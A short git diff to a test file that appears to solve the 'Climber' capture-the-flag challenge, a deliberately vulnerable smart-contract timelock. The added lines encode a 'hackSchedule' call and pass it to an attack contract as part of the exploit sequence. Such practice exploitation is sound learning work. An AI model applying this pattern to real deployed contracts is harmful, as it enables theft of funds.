@@ -102,6 +102,12 @@ describe("[Challenge] Climber", function () {
       climberAttack.address,
     ]);
     dataElements.push(data2);
+    let abi3 = [`function hackSchedule()`];
+    let iface3 = new ethers.utils.Interface(abi3);
+    let data3 = iface3.encodeFunctionData("hackSchedule", []);
+    dataElements.push(data3);
+    console.log(dataElements);
+    await climberAttack.addData(dataElements);
   });
 
   after(async function () {
